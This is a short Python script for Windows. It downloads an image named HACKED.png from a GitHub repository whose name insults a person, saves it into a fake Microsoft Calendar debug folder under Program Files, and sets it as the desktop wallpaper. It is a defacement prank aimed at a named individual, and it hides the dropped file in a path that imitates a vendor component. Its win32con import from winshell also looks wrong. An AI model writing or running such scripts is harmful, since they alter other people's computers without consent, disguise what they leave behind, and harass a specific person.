import os
import ctypes
import urllib.request
from winshell import win32con                         

url = "https://github.com/AlexanderBissett/Yurii-is-a-idiot/raw/main/HACKED.png"
address = r"C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\debug\10.0.15063.0\x64\HACKED.png"
filename, headers = urllib.request.urlretrieve(url, filename = address)
ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, address , 3)
